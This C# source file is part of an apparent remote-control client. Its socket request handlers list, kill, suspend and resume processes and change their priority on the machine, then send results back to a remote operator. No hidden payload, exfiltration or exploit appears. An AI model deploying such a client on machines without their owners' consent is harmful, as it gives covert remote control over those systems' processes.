using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using RemoteControl.Protocals;
using RemoteControl.Protocals.Request;
using RemoteControl.Protocals.Response;
using RemoteControl.Protocals.Utilities;

namespace RemoteControl.Client.Handlers
{
    partial class RequestGetProcessesHandler
    {
        static void StartGetProcesses(SocketSession session, RequestGetProcesses req)
        {
            ResponseGetProcesses resp = new ResponseGetProcesses();

            try
            {
                List<ProcessProperty> processes = null;
                if (req.IsSimpleMode)
                {
                    processes = ProcessUtil.GetProcessProperyListBySimple();
                }
                else
                {
                    processes = ProcessUtil.GetProcessProperyList();
                }
                resp.Processes = processes.OrderBy(s => s.ProcessName).ToList();
            }
            catch (Exception ex)
            {
                resp.Result = false;
                resp.Message = ex.Message;
            }

            session.Send(ePacketType.PACKET_GET_PROCESSES_RESPONSE, resp);
        }

        static void StartKillProcesses(SocketSession session, RequestKillProcesses req)
        {
            var processList = Process.GetProcesses().ToList();
            for (int i = 0; i < req.ProcessIds.Count; i++)
            {
                string processId = req.ProcessIds[i];
                try
                {
                    Process p = processList.Find(m => m.Id.ToString() == processId);
                    if (p == null)
                        continue;

                    p.Kill();
                }
                catch (Exception)
                {
                }
            }
        }

        static void SuspendProcesses(SocketSession session, RequestKillProcesses req)
        {
            var resp = new ResponseProcessOperation { Operation = "Suspend" };
            try
            {
                var processList = Process.GetProcesses().ToList();
                foreach (string pidStr in req.ProcessIds)
                {
                    int pid;
                    if (!int.TryParse(pidStr, out pid)) continue;
                    Process p = processList.Find(m => m.Id == pid);
                    if (p == null) continue;
                    foreach (ProcessThread t in p.Threads)
                    {
                        IntPtr hThread = OpenThread(THREAD_SUSPEND_RESUME, false, (uint)t.Id);
                        if (hThread != IntPtr.Zero)
                        {
                            SuspendThread(hThread);
                            CloseHandle(hThread);
                        }
                    }
                    resp.ProcessId = pid;
                }
                resp.Result = true;
                resp.Message = "已挂起进程";
            }
            catch (Exception ex)
            {
                resp.Result = false;
                resp.Message = ex.Message;
            }
            session.Send(ePacketType.PACKET_SUSPEND_PROCESS_RESPONSE, resp);
        }

        static void ResumeProcesses(SocketSession session, RequestKillProcesses req)
        {
            var resp = new ResponseProcessOperation { Operation = "Resume" };
            try
            {
                var processList = Process.GetProcesses().ToList();
                foreach (string pidStr in req.ProcessIds)
                {
                    int pid;
                    if (!int.TryParse(pidStr, out pid)) continue;
                    Process p = processList.Find(m => m.Id == pid);
                    if (p == null) continue;
                    foreach (ProcessThread t in p.Threads)
                    {
                        IntPtr hThread = OpenThread(THREAD_SUSPEND_RESUME, false, (uint)t.Id);
                        if (hThread != IntPtr.Zero)
                        {
                            ResumeThread(hThread);
                            CloseHandle(hThread);
                        }
                    }
                    resp.ProcessId = pid;
                }
                resp.Result = true;
                resp.Message = "已恢复进程";
            }
            catch (Exception ex)
            {
                resp.Result = false;
                resp.Message = ex.Message;
            }
            session.Send(ePacketType.PACKET_RESUME_PROCESS_RESPONSE, resp);
        }

        static void SetProcessPriority(SocketSession session, RequestSetProcessPriority req)
        {
            var resp = new ResponseProcessOperation { Operation = "SetPriority", ProcessId = req.ProcessId };
            try
            {
                Process p = Process.GetProcessById(req.ProcessId);
                ProcessPriorityClass pc;
                switch (req.PriorityClass)
                {
                    case "Idle": pc = ProcessPriorityClass.Idle; break;
                    case "BelowNormal": pc = ProcessPriorityClass.BelowNormal; break;
                    case "Normal": pc = ProcessPriorityClass.Normal; break;
                    case "AboveNormal": pc = ProcessPriorityClass.AboveNormal; break;
                    case "High": pc = ProcessPriorityClass.High; break;
                    case "RealTime": pc = ProcessPriorityClass.RealTime; break;
                    default: pc = ProcessPriorityClass.Normal; break;
                }
                p.PriorityClass = pc;
                resp.Result = true;
                resp.Message = "优先级已设置为 " + req.PriorityClass;
            }
            catch (Exception ex)
            {
                resp.Result = false;
                resp.Message = ex.Message;
            }
            session.Send(ePacketType.PACKET_SET_PROCESS_PRIORITY_RESPONSE, resp);
        }
    }
}
